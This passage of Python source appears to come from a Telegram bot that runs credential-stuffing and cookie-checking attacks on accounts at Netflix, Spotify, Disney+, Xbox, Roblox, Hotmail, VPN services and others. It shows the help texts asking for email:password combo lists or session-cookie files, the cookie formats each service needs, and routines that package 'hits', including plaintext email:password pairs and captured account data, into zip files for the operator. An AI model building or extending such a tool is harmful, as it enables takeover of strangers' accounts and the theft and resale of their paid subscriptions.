        return (f"{EX_ROCKET} <b>ExpressVPN Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo or <code>.zip</code>.\n\nRequires: <code>pycryptodome</code> + <code>asn1crypto</code>")
    if mode == "primevideo":
        return (f"{PV_ICON} <b>Prime Video Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send cookie file (<code>.txt</code>/<code>.json</code>/<code>.zip</code>).\n\n"
                f"{PV_PAID} Paid · {PV_FREE} Free · {PV_UNKNOWN} Unknown · "
                f"{PV_DUP} Dup · {PV_FAIL} Failed")
    if mode == "xbox":
        return (f"{XB_GAME} <b>Xbox Live Auditor</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"<b>Detects:</b>\n"
                f"{XB_PREMIUM} PREMIUM — GamePass subs or premium games\n"
                f"{XB_HIT} HIT     — Games but no premium\n"
                f"{XB_FREE} FREE    — Empty profile\n"
                f"{XB_NOXBOX} NO_XBOX — Microsoft ok but no Xbox profile\n"
                f"{MSFC_2FA} LOCKED  — 2FA, account locked, challenge\n\n"
                f"<b>Captures:</b> Gamertag · Gamerscore · Subs · Games list · Tenure · Region · Minecraft")
    if mode == "xboxcap":
        return (f"{XB_GAME} <b>Xbox Full Capture</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"<b>Detects:</b>\n"
                f"{XB_HIT} HIT   — Full account data\n"
                f"{SS_DEAD} BAD   — Wrong creds / low GS / no Xbox\n"
                f"{MSFC_2FA} 2FA   — 2FA required\n\n"
                f"<b>Captures:</b> Gamertag · Gamerscore · GamePass tier · Games list with premium tags")
    if mode == "dazn":
        return (f"{DZ_SPORT} <b>DAZN Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"{DZ_PREMIUM} HIT · {DZ_FREE} FREE · {DZ_DEAD} BAD · {SP_BOLT} RETRY\n\n"
                f"<b>Captures:</b> Plan · Country · Expiry · Days Left · Trial · Partner")
    if mode == "deezer":
        return (f"{DZR_MUSIC} <b>Deezer Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"{DZR_PREMIUM} PREMIUM · {DZR_FREE} FREE · {SS_DEAD} BAD\n\n"
                f"<b>Captures:</b> Offer · Expiry · Days · Country · Plan Type · Username")
    if mode == "disney":
        return (f"{DS_CASTLE} <b>Disney+ Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"{DS_PREMIUM} HIT · {DS_FREE} FREE · {SS_DEAD} BAD · {SP_BOLT} RETRY · {CR_RETRY} CUSTOM\n\n"
                f"<b>Captures:</b> Plan · Country · Expiry · Renewal · Profiles · Partner · Trial")
    if mode == "roblox":
        return (f"{RB_GAME} <b>Roblox Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>username:password</code> per line) or <code>.zip</code>.\n\n"
                f"{RB_HIT} HIT · {RB_PREMIUM} PREMIUM · {RB_FREE} FREE · {RB_2FA} 2FA · {RB_LOCKED} LOCKED\n\n"
                f"<b>Captures:</b> Username · UID · Robux · Premium · Country · DOB · Badges · Games · Bundles")
    return f"{label}"


FORMAT_TEXTS = {
    "surfshark": (f"{E_HELP} <b>Surfshark Cookie Format</b>\n\n"
                  "Required: <code>_sstk</code> + <code>_ssrtk</code> (JWT)\n\n"
                  "<b>1. Netscape</b>\n<code>#HttpOnly_.surfshark.com TRUE / TRUE 0 _sstk VALUE</code>\n\n"
                  "<b>2. Key=Value</b>\n<code>_sstk=VALUE\n_ssrtk=VALUE</code>"),
    "spotify": (f"{E_HELP} <b>Spotify Cookie Format</b>\n\n"
                "<b>Required:</b> <code>sp_dc</code>\n\n"
                "<code>.spotify.com TRUE / FALSE 0 sp_dc VALUE</code>"),
    "hotstar": (f"{E_HELP} <b>JioHotstar Cookie Format</b>\n\n"
                "<b>Required:</b> <code>sessionUserUP</code> or <code>userUP</code>\n\n"
                "Netscape / JSON / key=value all supported"),
    "netflix": (f"{E_HELP} <b>Netflix Cookie Format</b>\n\n"
                "<b>Required:</b> <code>NetflixId</code>\n\n"
                "Netscape / JSON array / key=value all supported"),
    "netflixcap": (f"{E_HELP} <b>Netflix Cap Combo</b>\n\n"
                   "<code>email:password</code> per line\n\nRequires <code>curl_cffi</code> installed"),
    "hbomax": (f"{E_HELP} <b>HBO Max Cookie Format</b>\n\n"
               "<b>Required:</b> <code>st</code> (JWT starting with <code>eyJ</code>)\n\n"
               "<code>st=eyJ...</code>"),
    "hotmail": (f"{E_HELP} <b>Hotmail Combo Format</b>\n\n<code>email:password</code> per line"),
    "msfullcap": (f"{E_HELP} <b>MS Full Cap Combo Format</b>\n\n<code>email:password</code> per line"),
    "crunchyroll": (f"{E_HELP} <b>Crunchyroll Combo Format</b>\n\n<code>email:password</code> per line"),
    "crunchyroll2": (f"{E_HELP} <b>Crunchyroll 2 Combo Format</b>\n\n<code>email:password</code> per line"),
    "expressvpn": (f"{E_HELP} <b>ExpressVPN Combo Format</b>\n\n<code>email:password</code> per line"),
    "primevideo": (f"{E_HELP} <b>Prime Video Cookie Format</b>\n\n"
                   "Required (any one): <code>session-token</code>, <code>x-main-av</code>, "
                   "<code>at-main</code>, <code>ubid-main</code>\n\n"
                   "Netscape / JSON supported"),
    "xbox": (f"{E_HELP} <b>Xbox Auditor Combo Format</b>\n\n"
             "<code>email:password</code> per line\n\n"
             "Standard Microsoft/Xbox credentials. Full profile + GamePass + games list captured."),
    "xboxcap": (f"{E_HELP} <b>Xbox Full Capture Combo Format</b>\n\n"
                "<code>email:password</code> per line\n\n"
                "Lighter flow — gamertag, gamerscore, GamePass tier, games list."),
    "dazn": (f"{E_HELP} <b>DAZN Combo Format</b>\n\n"
             "<code>email:password</code> per line\n\n"
             "Standard DAZN account credentials."),
    "deezer": (f"{E_HELP} <b>Deezer Combo Format</b>\n\n"
               "<code>email:password</code> per line\n\n"
               "Standard Deezer account credentials."),
    "disney": (f"{E_HELP} <b>Disney+ Combo Format</b>\n\n"
               "<code>email:password</code> per line\n\n"
               "Standard Disney+ account credentials."),
    "roblox": (f"{E_HELP} <b>Roblox Combo Format</b>\n\n"
               "<code>username:password</code> per line\n\n"
               "Roblox accepts username OR email. Both work."),
}


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    RESULTS ZIP SENDERS                                  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _send_zip(chat_id, uid, bot: Bot):
    r    = user_results[uid]
    mode = r["mode"]

    # ── SURFSHARK ───────────────────────────────────────────────────────────
    if mode == "surfshark":
        premium, free, dead = r["ss_premium"], r["ss_free"], r["ss_dead"]
        total = r["ss_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        revived = sum(1 for x in premium if x.get("revived"))
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for res in premium:
                slug = _gc_safe_slug(res.get("plan", "Unknown"))
                em   = _gc_safe_slug(res.get("email", "unk").split("@")[0])
                zf.writestr(f"premium/{slug}/{em}_{res.get('expires_at','unk')}.txt", res.get("content", ""))
            for res in free:
                em = _gc_safe_slug(res.get("email", "unk").split("@")[0])
                zf.writestr(f"free/free_{em}.txt", res.get("content", ""))
            lines = [f"Surfshark Summary\nTotal: {total}\nPremium: {len(premium)}\nFree: {len(free)}",
                     f"Dead: {len(dead)}\nRevived: {revived}",
                     f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}"]
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"surfshark_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Surfshark</b>  Premium: <b>{len(premium)}</b>",
                                parse_mode="HTML")

    # ── SPOTIFY ─────────────────────────────────────────────────────────────
    elif mode == "spotify":
        premium, free, dead = r["sp_premium"], r["sp_free"], r["sp_dead"]
        total = r["sp_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for res in premium + free + dead:
                folder = {"PREMIUM": "premium", "FREE": "free", "DEAD": "dead"}.get(res["status"], "dead")
                nm = re.sub(r"[^\w\-.]", "_", res.get("filename", "cookie")) or "cookie.txt"
                zf.writestr(f"{folder}/{nm}", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"spotify_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Spotify</b>  Premium: <b>{len(premium)}</b>",
                                parse_mode="HTML")

    # ── JIOHOTSTAR ──────────────────────────────────────────────────────────
    elif mode == "hotstar":
        live, device, free, invalid = r["hs_live"], r["hs_device"], r["hs_free"], r["hs_invalid"]
        total = r["hs_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        bd = hs_plan_breakdown(live)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for res in live:
                slug = _gc_safe_slug(res.get("plan", "Unknown"))
                zf.writestr(f"live/{slug}/{res.get('name','unk')}.txt", hs_convert_to_netscape(res.get("cookies", {})))
            for res in device:
                zf.writestr(f"device_limit/device_{res.get('name','unk')}.txt", hs_convert_to_netscape(res.get("cookies", {})))
            for res in free:
                zf.writestr(f"free/free_{res.get('name','unk')}.txt", hs_convert_to_netscape(res.get("cookies", {})))
            lines = [f"Hotstar Summary\nTotal: {total}\nLive: {len(live)}\nDevice Limit: {len(device)}",
                     f"Free: {len(free)}\nInvalid: {len(invalid)}", "\n-- LIVE BY PLAN --"]
            for plan, items in sorted(bd.items(), key=lambda x: -len(x[1])):
                lines.append(f"  {plan}: {len(items)}")
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"hotstar_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Hotstar</b>  Live: <b>{len(live)}</b>  Device: <b>{len(device)}</b>",
                                parse_mode="HTML")

    # ── NETFLIX (simple) ────────────────────────────────────────────────────
    elif mode == "netflix":
        premium, free_l, dead, tokens = r["nf_premium"], r["nf_free"], r["nf_dead"], r["nf_tokens"]
        total = r["nf_total"]
        sub = r.get("nf_sub", "check")
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            if sub == "nftoken":
                for idx, res in enumerate(tokens, 1):
                    zf.writestr(f"tokens/token_{idx}.txt", nf_build_token_export(res, idx))
            else:
                for idx, res in enumerate(premium, 1):
                    zf.writestr(f"premium/hit_{idx}.txt", nf_build_export(res, idx))
                for idx, res in enumerate(free_l, 1):
                    zf.writestr(f"free/free_{idx}.txt", nf_build_export(res, idx))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"netflix_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Netflix</b>  Premium: <b>{len(premium)}</b>  Tokens: <b>{len(tokens)}</b>",
                                parse_mode="HTML")

    # ── NETFLIX CAP ─────────────────────────────────────────────────────────
    elif mode == "netflixcap":
        hit, free_l, bad, tfa, custom = r["nfc_hit"], r["nfc_free"], r["nfc_bad"], r["nfc_2fa"], r["nfc_custom"]
        total = r["nfc_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hit, 1):
                zf.writestr(f"hit/hit_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(free_l, 1):
                zf.writestr(f"free/free_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(custom, 1):
                zf.writestr(f"custom/custom_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"netflixcap_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Netflix Cap</b>  Hit: <b>{len(hit)}</b>",
                                parse_mode="HTML")

    # ── HBO MAX ─────────────────────────────────────────────────────────────
    elif mode == "hbomax":
        live, dead = r["hbo_live"], r["hbo_dead"]
        total = r["hbo_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for res in live:
                em = _gc_safe_slug(res.get("email", "unk").split("@")[0])
                zf.writestr(f"live/{_gc_safe_slug(res.get('region','unk'))}/{em}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"hbomax_{ts}.zip"),
                                caption=f"{E_ZIP} <b>HBO Max</b>  Live: <b>{len(live)}</b>",
                                parse_mode="HTML")

    # ── HOTMAIL ─────────────────────────────────────────────────────────────
    elif mode == "hotmail":
        hits, dead = r["hm_hits"], r["hm_dead"]
        total = r["hm_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hits, 1):
                zf.writestr(f"hits/hit_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"hotmail_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Hotmail</b>  Hits: <b>{len(hits)}</b>",
                                parse_mode="HTML")

    # ── MS FULLCAP ──────────────────────────────────────────────────────────
    elif mode == "msfullcap":
        hits, bad, tfa = r["msfc_hits"], r["msfc_bad"], r["msfc_2fa"]
        total = r["msfc_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hits, 1):
                zf.writestr(f"hits/hit_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"msfullcap_{ts}.zip"),
                                caption=f"{E_ZIP} <b>MS Full Cap</b>  Hits: <b>{len(hits)}</b>",
                                parse_mode="HTML")

    # ── CRUNCHYROLL ─────────────────────────────────────────────────────────
    elif mode == "crunchyroll":
        hit, custom, fail, retry = r["cr_hit"], r["cr_custom"], r["cr_fail"], r["cr_retry"]
        total = r["cr_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hit, 1):
                zf.writestr(f"success/hit_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(custom, 1):
                zf.writestr(f"custom/custom_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"crunchyroll_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Crunchyroll</b>  Success: <b>{len(hit)}</b>  Custom: <b>{len(custom)}</b>",
                                parse_mode="HTML")

    # ── CRUNCHYROLL 2 ───────────────────────────────────────────────────────
    elif mode == "crunchyroll2":
        premium, free, valid, invalid, mfa = (r["cr2_premium"], r["cr2_free"], r["cr2_valid"],
                                              r["cr2_invalid"], r["cr2_mfa"])
        total = r["cr2_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for bucket, name in [(premium, "premium"), (free, "free"), (valid, "valid")]:
                for idx, res in enumerate(bucket, 1):
                    zf.writestr(f"{name}/{name}_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"crunchyroll2_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Crunchyroll 2</b>  Premium: <b>{len(premium)}</b>",
                                parse_mode="HTML")

    # ── EXPRESSVPN ──────────────────────────────────────────────────────────
    elif mode == "expressvpn":
        premium, free, dead, retry = r["ex_premium"], r["ex_free"], r["ex_dead"], r["ex_retry"]
        total = r["ex_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(premium, 1):
                zf.writestr(f"premium/premium_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(free, 1):
                zf.writestr(f"free/free_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(retry, 1):
                zf.writestr(f"retry/retry_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"expressvpn_{ts}.zip"),
                                caption=f"{E_ZIP} <b>ExpressVPN</b>  Premium: <b>{len(premium)}</b>",
                                parse_mode="HTML")

    # ── PRIME VIDEO ─────────────────────────────────────────────────────────
    elif mode == "primevideo":
        paid, free, unknown, dup, failed, error = (
            r["pv_paid"], r["pv_free"], r["pv_unknown"], r["pv_duplicate"],
            r["pv_failed"], r["pv_error"])
        total = r["pv_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(paid, 1):
                zf.writestr(f"paid/paid_{idx}_{_gc_safe_slug(res.get('region','unk'))}.txt", res.get("content", ""))
            for idx, res in enumerate(free, 1):
                zf.writestr(f"free/free_{idx}_{_gc_safe_slug(res.get('region','unk'))}.txt", res.get("content", ""))
            for idx, res in enumerate(unknown, 1):
                zf.writestr(f"unknown/unknown_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(dup, 1):
                zf.writestr(f"duplicate/dup_{idx}.txt", res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"primevideo_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Prime Video</b>  Paid: <b>{len(paid)}</b>  Free: <b>{len(free)}</b>",
                                parse_mode="HTML")

    # ── XBOX AUDITOR ────────────────────────────────────────────────────────
    elif mode == "xbox":
        premium, hit, free, noxbox = r["xbox_premium"], r["xbox_hit"], r["xbox_free"], r["xbox_noxbox"]
        bad, locked, error = r["xbox_bad"], r["xbox_locked"], r["xbox_error"]
        total = r["xbox_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for bucket, name in [(premium, "premium"), (hit, "hit"), (free, "free")]:
                for idx, res in enumerate(bucket, 1):
                    zf.writestr(f"{name}/{name}_{idx}_{_gc_safe_slug(res.get('gamertag','unk'))}.txt", res.get("content", ""))
            for idx, res in enumerate(noxbox, 1):
                zf.writestr(f"no_xbox/no_xbox_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            for idx, res in enumerate(bad, 1):
                zf.writestr(f"bad/bad_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            for idx, res in enumerate(locked, 1):
                zf.writestr(f"locked/locked_{idx}_{_gc_safe_slug(res.get('reason','unk'))}.txt",
                            f"{res.get('email','')}:{res.get('password','')}")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"xbox_{ts}.zip"),
                                caption=(f"{E_ZIP} <b>Xbox Auditor</b>  Premium: <b>{len(premium)}</b>  "
                                         f"Hit: <b>{len(hit)}</b>  Free: <b>{len(free)}</b>"),
                                parse_mode="HTML")

    # ── XBOX FULL CAPTURE ───────────────────────────────────────────────────
    elif mode == "xboxcap":
        hits, bad, tfa, error = r["xboxcap_hits"], r["xboxcap_bad"], r["xboxcap_2fa"], r["xboxcap_error"]
        total = r["xboxcap_total"]
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hits, 1):
                gp = res.get("gamepass", "none")
                folder = "premium" if gp != "none" else "hit"
                zf.writestr(f"{folder}/hit_{idx}_{_gc_safe_slug(res.get('gamertag','unk'))}.txt",
                            res.get("content", ""))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"xboxcap_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Xbox Full Capture</b>  Hits: <b>{len(hits)}</b>",
                                parse_mode="HTML")

    # ── DAZN ────────────────────────────────────────────────────────────────
    elif mode == "dazn":
        hits, free, retry = r["dazn_hit"], r["dazn_free"], r["dazn_retry"]
        total = r.get("dazn_total", 0)
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hits, 1):
                plan_slug = _gc_safe_slug(res.get("plan", "Unknown"))
                zf.writestr(f"hit/{plan_slug}/hit_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(free, 1):
                zf.writestr(f"free/free_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            lines = [f"DAZN Summary\nTotal: {total}\nHits: {len(hits)}\nFree: {len(free)}\nRetry: {len(retry)}",
                     f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}"]
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"dazn_{ts}.zip"),
                                caption=f"{E_ZIP} <b>DAZN</b>  Hits: <b>{len(hits)}</b>",
                                parse_mode="HTML")

    # ── DEEZER ──────────────────────────────────────────────────────────────
    elif mode == "deezer":
        premium, free = r["deezer_premium"], r["deezer_free"]
        total = r.get("deezer_total", 0)
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(premium, 1):
                offer_slug = _gc_safe_slug(res.get("offer", "Unknown"))
                zf.writestr(f"premium/{offer_slug}/premium_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(free, 1):
                zf.writestr(f"free/free_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            lines = [f"Deezer Summary\nTotal: {total}\nPremium: {len(premium)}\nFree: {len(free)}",
                     f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}"]
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"deezer_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Deezer</b>  Premium: <b>{len(premium)}</b>",
                                parse_mode="HTML")

    # ── DISNEY+ ─────────────────────────────────────────────────────────────
    elif mode == "disney":
        hits, free = r["disney_hit"], r["disney_free"]
        total = r.get("disney_total", 0)
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for idx, res in enumerate(hits, 1):
                plan_slug = _gc_safe_slug(res.get("plan", "Unknown"))
                zf.writestr(f"hit/{plan_slug}/hit_{idx}.txt", res.get("content", ""))
            for idx, res in enumerate(free, 1):
                zf.writestr(f"free/free_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            lines = [f"Disney+ Summary\nTotal: {total}\nHits: {len(hits)}\nFree: {len(free)}",
                     f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}"]
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"disney_{ts}.zip"),
                                caption=f"{E_ZIP} <b>Disney+</b>  Hits: <b>{len(hits)}</b>",
                                parse_mode="HTML")

    # ── ROBLOX ──────────────────────────────────────────────────────────────
    elif mode == "roblox":
        hit, prem, free = r["roblox_hit"], r["roblox_premium"], r["roblox_free"]
        twofa, locked = r["roblox_2fa"], r["roblox_locked"]
        total = r.get("roblox_total", 0)
        if not total:
            await bot.send_message(chat_id, f"{E_EMPTY} No results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
            return
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for bucket_name, bucket in [("premium", prem), ("hit", hit)]:
                for idx, res in enumerate(bucket, 1):
                    u = res.get("user", {}) or {}
                    zf.writestr(f"{bucket_name}/{bucket_name}_{idx}_{_gc_safe_slug(u.get('username','unk'))}.txt",
                                res.get("content", ""))
            for idx, res in enumerate(free, 1):
                u = res.get("user", {}) or {}
                zf.writestr(f"free/free_{idx}_{_gc_safe_slug(u.get('username','unk'))}.txt",
                            res.get("content", ""))
            for idx, res in enumerate(twofa, 1):
                zf.writestr(f"2fa/2fa_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            for idx, res in enumerate(locked, 1):
                zf.writestr(f"locked/locked_{idx}.txt", f"{res.get('email','')}:{res.get('password','')}")
            lines = [f"Roblox Summary\nTotal: {total}\nPremium: {len(prem)}\nHit: {len(hit)}",
                     f"Free: {len(free)}\n2FA: {len(twofa)}\nLocked: {len(locked)}",
                     f"\nGenerated: {datetime.now():%Y-%m-%d %H:%M:%S}"]
            zf.writestr("summary.txt", "\n".join(lines))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(chat_id,
                                document=BufferedInputFile(buf.getvalue(), filename=f"roblox_{ts}.zip"),
                                caption=(f"{E_ZIP} <b>Roblox</b>  Premium: <b>{len(prem)}</b>  "
                                         f"Hit: <b>{len(hit)}</b>  Free: <b>{len(free)}</b>"),
                                parse_mode="HTML")


async def _send_stats(chat_id, uid, bot: Bot):
    r = user_results[uid]
    mode = r["mode"]
    if mode == "surfshark":
        p = len(r["ss_premium"]); f = len(r["ss_free"]); d = len(r["ss_dead"]); t = r["ss_total"]
        rev = sum(1 for x in r["ss_premium"] if x.get("revived"))
        text = (f"{E_STATS} <b>Surfshark Stats</b>\n\n"
                f"Checked: <b>{t}</b>\n{SS_PREMIUM} Premium: <b>{p}</b>\n{SS_FREE} Free: <b>{f}</b>\n"
                f"{SS_DEAD} Dead: <b>{d}</b>\n{SS_REVIVED} Revived: <b>{rev}</b>")
    elif mode == "spotify":
        p = len(r["sp_premium"]); f = len(r["sp_free"]); d = len(r["sp_dead"]); t = r["sp_total"]
        text = f"{E_STATS} <b>Spotify Stats</b>\n\nChecked: <b>{t}</b>\n{SP_PREMIUM} Premium: <b>{p}</b>\n{SP_FREE} Free: <b>{f}</b>\n{SP_DEAD} Dead: <b>{d}</b>"
    elif mode == "hotstar":
        live, dev, free, inv = len(r["hs_live"]), len(r["hs_device"]), len(r["hs_free"]), len(r["hs_invalid"])
        bd = hs_plan_breakdown(r["hs_live"])
        text = (f"{E_STATS} <b>Hotstar Stats</b>\n\n"
                f"{HS_LIVE} Live: <b>{live}</b>\n{HS_DEVICE} Device: <b>{dev}</b>\n"
                f"{HS_FREE} Free: <b>{free}</b>\n{HS_INVALID} Invalid: <b>{inv}</b>\n\n"
                f"{E_STATS} <b>Live by Plan:</b>\n{_plan_lines(bd, '  ')}")
    elif mode == "netflix":
        p = len(r["nf_premium"]); f = len(r["nf_free"]); d = len(r["nf_dead"]); tk = len(r["nf_tokens"])
